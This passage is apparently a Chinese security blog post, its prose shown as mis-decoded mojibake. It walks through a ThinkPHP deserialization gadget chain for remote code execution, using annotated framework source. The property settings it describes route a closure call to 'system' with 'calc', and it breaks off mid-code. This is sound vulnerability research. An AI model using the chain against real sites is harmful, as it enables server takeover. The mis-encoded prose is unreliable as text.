<p>åœ¨ <code>db</code> å‡½æ•°ä¸­é¦–å…ˆè°ƒç”¨çš„ <code>connect</code> å‡½æ•°ç”¨äº<strong>åˆ›å»ºæˆ–åˆ‡æ¢æ•°æ®åº“è¿æ¥</strong>ï¼Œä½†æ˜¯ç”±äºç¬¬äºŒä¸ªå‚æ•° <code>$force</code> æ²¡æœ‰è®¾ç½®ï¼Œé»˜è®¤ä¸å¼ºåˆ¶é‡è¿ã€‚å› æ­¤ <strong><code>connect</code> å‡½æ•°èƒ½å¤Ÿæ­£å¸¸æ‰§è¡Œè¿‡å»ï¼Œä¸ä¼šæŠ¥é”™</strong>ã€‚</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è·å–å½“å‰æ¨¡å‹çš„æ•°æ®åº“æŸ¥è¯¢å¯¹è±¡</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array $scope è®¾ç½®ä¸ä½¿ç”¨çš„å…¨å±€æŸ¥è¯¢èŒƒå›´</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> Query</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">db</span>(<span class="params"><span class="variable">$scope</span> = []</span>): <span class="title">Query</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// è¿™é‡Œå¹¶ä¸å…³ç³» connect å‡½æ•°é€»è¾‘ï¼Œåªè¦ä¸æŠ¥é”™å°±è¡Œ</span></span><br><span class="line">    <span class="variable">$query</span> = <span class="built_in">self</span>::<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">connect</span>(<span class="variable">$this</span>-&gt;connection)</span><br><span class="line">        <span class="comment">// ğŸ“Œ å­—ç¬¦ä¸²æ“ä½œè§¦å‘ $this-&gt;name çš„ __toString å‡½æ•°è°ƒç”¨</span></span><br><span class="line">        -&gt;<span class="title function_ invoke__">name</span>(<span class="variable">$this</span>-&gt;name . <span class="variable">$this</span>-&gt;suffix)</span><br><span class="line">        -&gt;<span class="title function_ invoke__">pk</span>(<span class="variable">$this</span>-&gt;pk);</span><br><span class="line">    <span class="comment">// [...]        </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ä¹‹åçš„ <code>$this-&gt;name . $this-&gt;suffix</code> ä¼šè°ƒç”¨åˆ° <code>$this-&gt;name</code> çš„ <code>__toString</code> æ–¹æ³•ã€‚</p>
<p>ä¹‹åå’Œ RCE1 ä¸€æ ·ï¼ˆRCE1 æ˜¯é€šè¿‡ <code>file_exists</code> è§¦å‘çš„ï¼‰æˆ‘ä»¬å¯ä»¥è°ƒç”¨ <code>Pivot</code> çš„ <code>__toString</code> æ–¹æ³•ã€‚</p>
<p>ç”±äº <code>Pivot</code> <strong>é€šè¿‡ç»§æ‰¿æŠ½è±¡ç±» <code>Model</code><strong>ï¼Œ</strong>è€Œ <code>Model</code> ä½¿ç”¨äº† <code>think\model\concern\Conversion</code> å’Œ <code>think\model\concern\Attribute</code> è¿™ä¸¤ä¸ª trait</strong>ï¼Œä»è€Œè·å¾—äº†è¿™äº›æ–¹æ³•ï¼š</p>
<ul>
<li><p><code>Pivot-&gt;__toString</code>ï¼š<code>Conversion-&gt;__toString</code></p>
</li>
<li><p><code>Pivot-&gt;getAttr</code>ï¼š<code>Attribute-&gt;getAttr</code></p>
</li>
</ul>
<p>å› æ­¤é¦–å…ˆä¼šæœ‰ <strong><code>Conversion-&gt;__toString â†’ Conversion-&gt;toJson â†’ Conversion-&gt;toArray</code></strong> è°ƒç”¨é“¾ã€‚</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">toJson</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è½¬æ¢å½“å‰æ¨¡å‹å¯¹è±¡ä¸ºJSONå­—ç¬¦ä¸²</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  integer $options jsonå‚æ•°</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toJson</span>(<span class="params"><span class="keyword">int</span> <span class="variable">$options</span> = JSON_UNESCAPED_UNICODE</span>): <span class="title">string</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">toArray</span>(), <span class="variable">$options</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>toArray</code> æ–¹æ³•æœ€ç»ˆä¼šè°ƒç”¨ <code>Attribute-&gt;getAttr</code> æ–¹æ³•ï¼Œå‚æ•°ä¸º <code>$this-&gt;data</code> ä¸­çš„å…¶ä¸­ä¸€é¡¹çš„é”®ï¼Œè¿™é‡Œä¸º <code>&quot;key&quot;</code>ã€‚æœŸé—´çš„å‡ ä¸ªåˆ¤æ–­åªè¦æˆ‘ä»¬è®© <code>Pivot</code> ç›¸å…³å­—æ®µéƒ½ä¿æŒé»˜è®¤å€¼å³å¯ç»•è¿‡ã€‚</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è½¬æ¢å½“å‰æ¨¡å‹å¯¹è±¡ä¸ºæ•°ç»„</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span>(<span class="params"></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$item</span> = <span class="variable">$visible</span> = <span class="variable">$hidden</span> = [];</span><br><span class="line">    <span class="variable">$hasVisible</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// âŒ $this-&gt;visible ä¸ºç©ºä¸è¿›å…¥å¾ªç¯</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;visible <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// âŒ $this-&gt;hidden ä¸ºç©ºä¸è¿›å…¥å¾ªç¯</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;hidden <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// âŒ $this-&gt;append ä¸ºç©ºä¸è¿›å…¥å¾ªç¯</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;append <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$name</span>) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆå¹¶ $this-&gt;data å’Œ $this-&gt;relation</span></span><br><span class="line">    <span class="comment">// ç”±äº $this-&gt;relation ä¸ºç©ºå› æ­¤åˆå¹¶åè¿˜æ˜¯ $this-&gt;data</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;data, <span class="variable">$this</span>-&gt;relation);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">        <span class="comment">// $val æ˜¯æ•°ç»„ä¸” $visibleï¼Œ$hidden ä¸ºç©ºä¸” $hasVisible ä¸º false</span></span><br><span class="line">        <span class="comment">// ğŸ“Œ å› æ­¤åªä¼šè¿›å…¥æœ€åä¸€ä¸ªåˆ†æ”¯</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$val</span> <span class="keyword">instanceof</span> Model || <span class="variable">$val</span> <span class="keyword">instanceof</span> ModelCollection) &#123;</span><br><span class="line">            <span class="comment">// [...]</span></span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="variable">$visible</span>[<span class="variable">$key</span>])) &#123;</span><br><span class="line">            <span class="comment">// [...]</span></span><br><span class="line">        &#125; <span class="keyword">elseif</span> (!<span class="keyword">isset</span>(<span class="variable">$hidden</span>[<span class="variable">$key</span>]) &amp;&amp; !<span class="variable">$hasVisible</span>) &#123;</span><br><span class="line">            <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>); <span class="comment">// ğŸ‘ˆ è°ƒç”¨ Attribute-&gt;getAttr æ–¹æ³•</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>Attribute-&gt;getAttr</code> å…ˆè°ƒç”¨ <code>$this-&gt;getData</code> è·å–åˆ° <code>$value</code>ï¼Œç„¶åè°ƒç”¨ <code>$this-&gt;getValue</code> å‡½æ•°å¹¶ä¾æ¬¡ä¼ å…¥ <code>$name = &quot;key&quot;</code>ï¼Œ<code>$value</code>ï¼Œ<code>$relation = false</code> ä¸‰ä¸ªå‚æ•°ã€‚</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è·å–å™¨ è·å–æ•°æ®å¯¹è±¡çš„å€¼</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  string $name åç§° = &quot;key&quot;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> InvalidArgumentException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttr</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable">$relation</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="variable">$value</span>    = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getData</span>(<span class="variable">$name</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">InvalidArgumentException</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getValue</span>(<span class="variable">$name</span>, <span class="variable">$value</span>, <span class="variable">$relation</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>getData</code> è·å–åˆ°çš„æ˜¯ <code>$this-&gt;data[&quot;key&quot;] = [&quot;key&quot; =&gt; &quot;calc&quot;]</code>ã€‚</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è·å–å®é™…çš„å­—æ®µå</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> protected</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  string $name å­—æ®µå = &quot;key&quot;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getRealFieldName</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// è™½ç„¶å¯ä»¥é€šè¿‡è®¾ç½® $this çš„éƒ¨åˆ†å­—æ®µé¿å… $name è¢«ä¿®æ”¹</span></span><br><span class="line">    <span class="comment">// ä½†æ˜¯è¿™é‡Œæˆ‘ä»¬è®¾ç½® $name ä¸º &quot;key&quot; ä¸å—è½¬æ¢çš„å½±å“</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;convertNameToCamel || !<span class="variable language_">$this</span>-&gt;strict) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">Str</span>::<span class="title function_ invoke__">snake</span>(<span class="variable">$name</span>); <span class="comment">// é©¼å³°è½¬ä¸‹åˆ’çº¿</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è·å–å½“å‰å¯¹è±¡æ•°æ® å¦‚æœä¸å­˜åœ¨æŒ‡å®šå­—æ®µè¿”å›false</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  string $name å­—æ®µå ç•™ç©ºè·å–å…¨éƒ¨ = &quot;key&quot;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> InvalidArgumentException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// âŒ $name ä¸ä¸ºç©ºï¼Œä¸è¿›å…¥åˆ¤æ–­</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æˆ‘ä»¬è®¾ç½®çš„ name = &quot;key&quot; ä¸å— getRealFieldName çš„å½±å“</span></span><br><span class="line">    <span class="variable">$fieldName</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRealFieldName</span>(<span class="variable">$name</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨ $this-&gt;data å’Œ $this-&gt;relation éƒ½è¡Œ</span></span><br><span class="line">    <span class="comment">// å‰é¢éå†é”®å€¼å¯¹çš„ $data ä¹Ÿæ¥è‡ªè¿™ä¸¤ä¸ªæ•°ç»„æˆå‘˜åˆå¹¶çš„ç»“æœ</span></span><br><span class="line">    <span class="comment">// è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯ $this-&gt;data</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$fieldName</span>, <span class="variable">$this</span>-&gt;data)) &#123;</span><br><span class="line">        <span class="comment">// ğŸ“Œ è¿”å›çš„æ˜¯ $this-&gt;data[&quot;key&quot;] = [&quot;key&quot; =&gt; &quot;calc&quot;]</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;data[<span class="variable">$fieldName</span>];</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$fieldName</span>, <span class="variable">$this</span>-&gt;relation)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;relation[<span class="variable">$fieldName</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">InvalidArgumentException</span>(<span class="string">&#x27;property not exists:&#x27;</span> . <span class="built_in">static</span>::<span class="variable language_">class</span> . <span class="string">&#x27;-&gt;&#x27;</span> . <span class="variable">$name</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>åœ¨ <code>getValue</code> å‡½æ•°ä¸­è™½ç„¶æœ‰ä¸€ä¸ªé—­åŒ…å‡½æ•°çš„è°ƒç”¨ï¼Œä½†æ˜¯é™åˆ¶é™åˆ¶ <code>$closure</code> ä¸º <code>Closure</code> çš„å®ä¾‹ï¼Œå› æ­¤ä¸èƒ½å®ç°ä»»æ„æ–¹æ³•è°ƒç”¨ã€‚å› æ­¤æˆ‘ä»¬èµ°å¦ä¸€ä¸ªåˆ†æ”¯è°ƒç”¨ <code>getJsonValue</code> å‡½æ•°ã€‚</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è·å–ç»è¿‡è·å–å™¨å¤„ç†åçš„æ•°æ®å¯¹è±¡çš„å€¼</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> protected</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  string      $name å­—æ®µåç§° = &quot;key&quot;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  mixed       $value å­—æ®µå€¼ = [&quot;key&quot; =&gt; &quot;calc&quot;]</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  bool|string $relation æ˜¯å¦ä¸ºå…³è”å±æ€§æˆ–è€…å…³è”å = false</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> InvalidArgumentException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getValue</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span>, <span class="variable">$value</span>, <span class="variable">$relation</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// âœ… å’Œ getData é‡Œçš„ä¸€æ ·ï¼Œæˆ‘ä»¬è®¾ç½®çš„ name = &quot;key&quot; ä¸å— getRealFieldName çš„å½±å“</span></span><br><span class="line">    <span class="variable">$fieldName</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRealFieldName</span>(<span class="variable">$name</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// âŒ $this-&gt;get ä¸ºç©ºï¼Œä¸è¿›å…¥åˆ¤æ–­</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$fieldName</span>, <span class="variable">$this</span>-&gt;get)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;get[<span class="variable">$fieldName</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;withAttr[<span class="variable">$fieldName</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$relation</span>) &#123; <span class="comment">// âŒ $relation ä¸º falseï¼Œä¸è¿›å…¥åˆ¤æ–­</span></span><br><span class="line">            <span class="comment">// [...]</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// $fieldName =&quot;key&quot;,$this-&gt;json = [&quot;key&quot;],$this-&gt;withAttr[&quot;key&quot;] = [&quot;key&quot; =&gt; &quot;system&quot;]</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$fieldName</span>, <span class="variable">$this</span>-&gt;json) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;withAttr[<span class="variable">$fieldName</span>])) &#123;</span><br><span class="line">            <span class="comment">// âœ… è°ƒç”¨ getJsonValue å‡½æ•°</span></span><br><span class="line">            <span class="comment">// $fieldName =&quot;key&quot;,$value = [&quot;key&quot; =&gt; &quot;calc&quot;]</span></span><br><span class="line">            <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getJsonValue</span>(<span class="variable">$fieldName</span>, <span class="variable">$value</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$closure</span> = <span class="variable language_">$this</span>-&gt;withAttr[<span class="variable">$fieldName</span>];</span><br><span class="line">            <span class="comment">// âŒ é™åˆ¶ $closure ä¸º Closure çš„å®ä¾‹ä¸èƒ½å®ç°ä»»æ„æ–¹æ³•è°ƒç”¨</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$closure</span> <span class="keyword">instanceof</span> \<span class="built_in">Closure</span>) &#123;</span><br><span class="line">                <span class="variable">$value</span> = <span class="variable">$closure</span>(<span class="variable">$value</span>, <span class="variable language_">$this</span>-&gt;data);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>getJsonValue</code> åŒæ ·å­˜åœ¨é—­åŒ…å‡½æ•°çš„è°ƒç”¨ï¼Œå¹¶ä¸”ä¸¤å¤„é—­åŒ…è°ƒç”¨éƒ½æ˜¯å¯è¡Œçš„ã€‚è¿™é‡Œæˆ‘ä»¬é‡‡ç”¨å…¶ä¸­ä¸€ä¸ªå³å¯ã€‚</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è·å–JSONå­—æ®µå±æ€§å€¼</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> protected</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  string $name  å±æ€§å = &quot;key&quot;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  mixed  $value JSONæ•°æ® = [&quot;key&quot; =&gt; &quot;calc&quot;]</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getJsonValue</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// âŒ $value æºå¸¦å‚æ•°ï¼Œå› æ­¤ä¸ä¸ºç©º</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$value</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// $this-&gt;withAttr = [&quot;key&quot; =&gt; [&quot;key&quot; =&gt; &quot;system&quot;]]</span></span><br><span class="line">    <span class="comment">// $this-&gt;withAttr[$name] = [&quot;key&quot; =&gt; &quot;system&quot;]</span></span><br><span class="line">    <span class="comment">// $key = &quot;key&quot;, $closure = &quot;calc&quot;</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;withAttr[<span class="variable">$name</span>] <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$closure</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;jsonAssoc) &#123;</span><br><span class="line">            <span class="comment">// éœ€è¦è®¾ç½®ï¼š</span></span><br><span class="line">            <span class="comment">// $this-&gt;jsonAssoc = true;</span></span><br><span class="line">            <span class="comment">// $this-&gt;data = [&quot;key&quot; =&gt; [&quot;key&quot; =&gt; &quot;calc&quot;]];</span></span><br><span class="line">            <span class="variable">$value</span>[<span 